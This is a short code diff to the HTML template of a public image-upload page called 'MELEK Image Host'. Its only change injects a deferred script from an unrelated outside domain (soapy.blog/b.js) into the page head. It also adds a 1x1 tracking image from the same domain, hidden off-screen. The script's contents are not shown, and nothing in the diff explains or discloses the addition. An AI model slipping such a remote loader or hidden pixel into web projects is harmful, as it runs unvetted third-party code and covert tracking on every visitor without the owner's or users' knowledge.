@@ -202,7 +202,7 @@ function page() {
 <meta name=viewport content="width=device-width,initial-scale=1">
 <title>Image Host · MELEK</title>
 <meta name=description content="A simple public image uploader — drag, drop, and get direct / HTML / BBCode / Markdown embed codes.">
-<style>${STYLE}</style></head><body><div class=wrap>
+<style>${STYLE}</style><script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body><div class=wrap>
 <header><span class=brand><b>MELEK</b> Image Host</span><span class=alpha>Alpha</span></header>
 <p class=lead>Drag an image in (or pick a file) and get copy-ready share links — Direct, HTML, BBCode, Markdown.</p>
 <div class=note><b>🌐 Public host.</b> <span>Uploads are public and content-addressed. Images only (jpg / png / gif / webp / bmp), up to ${esc(cap)} MB. Don't upload anything private.</span></div>
